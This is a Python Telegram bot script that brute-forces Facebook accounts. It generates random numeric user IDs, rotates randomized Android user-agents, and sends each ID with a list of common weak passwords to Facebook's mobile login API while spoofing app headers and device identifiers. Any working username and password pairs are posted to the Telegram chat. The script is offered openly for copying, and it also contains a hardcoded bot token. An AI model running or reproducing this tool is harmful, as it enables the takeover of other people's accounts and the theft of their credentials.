import requests,random,sys,telebot
from telebot import types
L7Ngen=[]
pwpluss,pwnya=[],[]
# انضر لها وكأنها قمر يدور امامي فتأخذ قلبي وتكسره 
Token= "7154241780:AAFAEeRhV4Xog2ndj-zlieFwnGIByDUNXWI"
bot = telebot.TeleBot(Token)
L7N1 = types.InlineKeyboardButton(text ="Click To Start ⚡",callback_data = "L7N1")
L7N_2 = types.InlineKeyboardButton(text ="Programmer",url="t.me/Z_WUZ")

@bot.message_handler(commands=["start"])
def start(message):
	photo = f"t.me/{message.from_user.username}"
	tag = f"[{message.from_user.first_name}]({photo})"
	text = f"*Hello* {tag}* To Bot Check Acc Facebook 🐉 !*"
	L7Nbut1 = types.InlineKeyboardMarkup()
	L7Nbut1.add(L7N1)
	L7Nbut1.add(L7N_2)
	bot.send_photo(message.chat.id,photo,text ,
 parse_mode="Markdown",reply_markup=L7Nbut1)
@bot.callback_query_handler(lambda call:True)
def call(call): 
		if call.data == "L7N1":
			messag=bot.send_message(chat_id=call.message.chat.id,text=' *Send Your Name bro :*',parse_mode='Markdown')
			
			bot.register_next_step_handler(messag,L7N_check_acc_face,messag.id)
			for i in range(3131313131313):
				rr = random.randint
				andro=random.choice(['3.0','4.4.2','4.4.4','5.0.1','8.0','7.0','6.0','5.0','4.0','4.3.4','7.0.1','8.0.1','3','4','5','6','7','8','9','10','11','12','13'])
				rmx=random.choice(['Redmi 7','Redmi Note 8','Redmi 6A','Mi 9 Lite','Redmi Note 11 Pro','Redmi 5A','Mi 9 SE','POCO M4 Pro','POCO X3 Pro','Redmi 5 Plus','Redmi Note 10 Pro','M2007J22G','Redmi 9C NFC'])
				build=random.choice(['OPM1','TP1A','RP1A','PPR1','PKQ1','QP1A','SP1A','RKQ1'])
				vbuild=random.choice(['001','002','003','004','005','006','007','008','009','010','011','012','013','014','015','016','017','018','019','020'])
				mark=random.choice(['en-us','en-gb','id-id','de-de','ru-ru','en-sg','fr-fr','fa-ir','ja-jp','pt-br','cs-cz','zh-hk','zh-cn','vi-vn','en-ph','en-in','tr-tr'])
				aa_L7N=f'Mozilla/5.0 (Linux; Android {andro}; {rmx}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
				bb_L7N=f'Mozilla/5.0 (Linux; U; Android {andro}; {rmx}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
				cc_L7N=f'Mozilla/5.0 (Linux; Android {andro}; {mark}; {rmx}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
				dd_L7N=f'Mozilla/5.0 (Linux; U; Android {andro}; {mark}; {rmx}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
				ee_L7N=f'Mozilla/5.0 (Linux; Android {andro}; {rmx} Build/{build}.{str(rr(100000,250000))}.{vbuild}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
				ff_L7N=f'Mozilla/5.0 (Linux; U; Android {andro}; {rmx} Build/{build}.{str(rr(100000,250000))}.{vbuild}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
				gg_L7N=f'Mozilla/5.0 (Linux; Android {andro}; {mark}; {rmx} Build/{build}.{str(rr(100000,250000))}.{vbuild}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
				hh_L7N=f'Mozilla/5.0 (Linux; U; Android {andro}; {mark}; {rmx} Build/{build}.{str(rr(100000,250000))}.{vbuild}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
				ii_L7N=f'Mozilla/5.0 (Linux; Android {andro}; {rmx}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
				jj_L7N=f'Mozilla/5.0 (Linux; U; Android {andro}; {rmx}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
				kk_L7N=f'Mozilla/5.0 (Linux; Android {andro}; {mark}; {rmx}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
				ll_L7N=f'Mozilla/5.0 (Linux; U; Android {andro}; {mark}; {rmx}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
				mm_L7N=f'Mozilla/5.0 (Linux; Android {andro}; {rmx} Build/{build}.{str(rr(100000,250000))}.{vbuild}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
				nn_L7N=f'Mozilla/5.0 (Linux; U; Android {andro}; {rmx} Build/{build}.{str(rr(100000,250000))}.{vbuild}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
				oo_L7N=f'Mozilla/5.0 (Linux; Android {andro}; {mark}; {rmx} Build/{build}.{str(rr(100000,250000))}.{vbuild}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
				pp_L7N=f'Mozilla/5.0 (Linux; U; Android {andro}; {mark}; {rmx} Build/{build}.{str(rr(100000,250000))}.{vbuild}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
				L7Nconct = random.choice([aa_L7N,bb_L7N,cc_L7N,dd_L7N,ee_L7N,ff_L7N,gg_L7N,hh_L7N,ii_L7N,jj_L7N,kk_L7N,ll_L7N,mm_L7N,nn_L7N,oo_L7N,pp_L7N])
				L7Ngen.append(L7Nconct)

def L7N_check_acc_face(message,id):
    OK =0
    CP =0
    while True:
    	user='1234567890'
    	import random,requests
    	sa=''.join(random.choice(user) for i in range(10))
    	pas = ['00998877', '77889900', '12121212', 'zzxxccvv', '123123123', '123456', '١٢٣٤٥٦', 'qwerqwer', 'zxcvbnm', 'mmmmnnnn', 'zzzzxxxx', 'zzxxccvvbbnnmm', '123456654321','1234512345', '1234554321', '12345678', '11001100','00110022','66778899','99887766']
    	global emm,pss
    	ua = random.choice(L7Ngen)
    	sgsg=random.choice(['2','4','5','6','1','7','8','9'])
    	emm = '1000'+ sgsg + sa
    	session = requests.Session()
    	free_fb = session.get('https://m.facebook.com').text
    	for pss in pas:
    	   import requests, random, json, hashlib, uuid, time
    	   sys.stdout.flush()
    	   r    = requests.Session()
    	   head = {'Host':'b-graph.facebook.com','X-Fb-Connection-Quality':'EXCELLENT','Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','User-Agent':'Dalvik/2.1.0 (Linux; U; Android 7.1.2; RMX3740 Build/QP1A.190711.020) [FBAN/FB4A;FBAV/417.0.0.33.65;FBPN/com.facebook.katana;FBLC/in_ID;FBBV/480086274;FBCR/Corporation Tbk;FBMF/realme;FBBD/realme;FBDV/RMX3740;FBSV/7.1.2;FBCA/x86:armeabi-v7a;FBDM/{density=1.0,width=540,height=960};FB_FW/1;FBRV/483172840;]','X-Tigon-Is-Retry':'false','X-Fb-Friendly-Name':'authenticate','X-Fb-Connection-Bandwidth':str(random.randrange(70000000,80000000)),'Zero-Rated':'0','X-Fb-Net-Hni':str(random.randrange(50000,60000)),'X-Fb-Sim-Hni':str(random.randrange(50000,60000)),'X-Fb-Request-Analytics-Tags':'{"network_tags":{"product":"350685531728","retry_attempt":"0"},"application_tags":"unknown"}','Content-Type':'application/x-www-form-urlencoded','X-Fb-Connection-Type':'WIFI','X-Fb-Device-Group':str(random.randrange(4700,5000)),'Priority':'u=3,i','Accept-Encoding':'gzip, deflate','X-Fb-Http-Engine':'Liger','X-Fb-Client-Ip':'true','X-Fb-Server-Cluster':'true','Content-Length':str(random.randrange(1500,2000))}
    	   data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':emm,'password':'#PWD_FB4A:0:{}:{}'.format(str(time.time())[:10], pss),'generate_analytics_claim':'1','community_id':'','linked_guest_account_userid':'','cpl':True,'try_num':'1','family_device_id':str(uuid.uuid4()),'secure_family_device_id':str(uuid.uuid4()),'credentials_type':'password','account_switcher_uids':[],'fb4a_shared_phone_cpl_experiment':'fb4a_shared_phone_nonce_cpl_at_risk_v3','fb4a_shared_phone_cpl_group':'enable_v3_at_risk','enroll_misauth':False,'generate_session_cookies':'1','error_detail_type':'button_with_disabled','source':'login','machine_id':str(''.join([random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for i in range(24)])),'jazoest':str(random.randrange(22000,23000)),'meta_inf_fbmeta':'V2_UNTAGGED','advertiser_id':str(uuid.uuid4()),'encrypted_msisdn':'','currently_logged_in_userid':'0','locale':'id_ID','client_country_code':'ID','fb_api_req_friendly_name':'authenticate','fb_api_caller_class':'Fb4aAuthHandler','api_key':'882a8490361da98702bf97a021ddc14d','sig':str(hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:32]),'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
    	   pos  = r.post('https://b-graph.facebook.com/auth/login', data=data, headers=head).json()
    	   if ('session_key' in str(pos)) and ('access_token' in str(pos)):
    	       OK+=1
    	       bot.send_message(message.chat.id,text=f'''
❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {emm}
❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pss}
<><><><><><><><><><><><><><>
    	           	       ''')
    	   else:
    	   	CP+=1
    	   	
    	   	OK_CP_Check_L7N=types.InlineKeyboardButton(text=f"{emm} : {pss}", callback_data="L7NL7N")
    	   	OK1 =types.InlineKeyboardButton(text=f"OK : {OK}", callback_data="L7NL7N")
    	   	CP1 =types.InlineKeyboardButton(text=f"Bad : {CP}", callback_data="L7NL7N")
    	   	L7Nurl =types.InlineKeyboardButton(text="Programmer ", url="t.me/Z_WUZ")
    	   	L7Nbut2 = types.InlineKeyboardMarkup(row_width=3)
    	   	L7Nbut2 = types.InlineKeyboardMarkup()
    	   	L7Nbut2.add(OK_CP_Check_L7N)
    	   	L7Nbut2.add(OK1)
    	   	L7Nbut2.add(CP1)
    	   	L7Nbut2.add(L7Nurl)
		time.sleep(2)
    	   	bot.edit_message_text(chat_id=message.chat.id,message_id=id,text="اهلا صديقي نورت هنا لقد تم بدء الصيد",parse_mode='markdown',reply_markup=L7Nbut2)
    	   	#time.sleep(3)
    	   	#bot.edit_message_text(chat_id=message.chat.id,message_id=id,text="""
#*Checking in Progress, Good Luck.. ! *
#By : [𝐋7𝐍 «𓆩ᶠᴮᴵ𓆪» ™](t.me/Z_WUZ) 🐉
#""",parse_mode="markdown",disable_web_page_preview = 'true',reply_markup=L7Nbut2)

# اخمط وغير حقوق بس اذكر مصدري ماانشرك + تخمط تبين لان اول بوت فيس هذا لا تصير لوتي 🐉
#L7N 

bot.infinity_polling()
